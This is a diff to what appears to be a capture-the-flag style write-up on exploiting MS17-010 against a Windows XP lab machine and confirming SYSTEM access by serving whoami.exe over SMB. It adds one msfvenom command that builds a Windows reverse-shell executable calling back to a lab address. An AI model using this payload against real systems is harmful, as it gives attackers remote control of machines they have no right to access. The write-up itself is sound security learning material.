@@ -85,6 +85,10 @@ I found a lot of exploits for MS-17-010 but doesn't work in Windows XP. Fortunat
 
 I will use *msfvenom* again, but in this time, i don’t need to worry about bad characters or variable names because i can use *exe* file:
 
+`
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=442 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.14.11_443.exe
+`
+
 ![msvenom2](https://user-images.githubusercontent.com/43796175/105803357-4ba25000-5f6b-11eb-8d59-b5d24a3ccafb.jpg)
 
 Now i will start a listener and then run the exploit:
@@ -101,4 +105,22 @@ As you may noticed, the system command "*whoami*" doesn't work in anyone case. L
 
 First, is necessary check the path of this binary in your system (i'm running Parrot OS, but in Kali Linux work fine):
 
+`
+/usr/share/windows-binaries/
+`
 
+![whoami](https://user-images.githubusercontent.com/43796175/105804291-6aa1e180-5f6d-11eb-92f2-c410027c53d8.jpg)
+
+Now, i will use *smbserver.py* for share my folder and use the binary *whoami* in the victim machine:
+
+![server](https://user-images.githubusercontent.com/43796175/105804410-bce30280-5f6d-11eb-8fac-84cb427ea3c6.jpg)
+
+Then, you can run this and see that you're system:
+
+![final](https://user-images.githubusercontent.com/43796175/105804555-1814f500-5f6e-11eb-9903-0efb3c9cbbc2.jpg)
+
+![syst](https://user-images.githubusercontent.com/43796175/105804532-092e4280-5f6e-11eb-9921-102db8b7ad11.jpg)
+
+There are other ways i could check, like having access to write in certain places (system32 path for example). 
+
+Getting *whoami.exe*is certainly one of the easiest and most definitive methods.
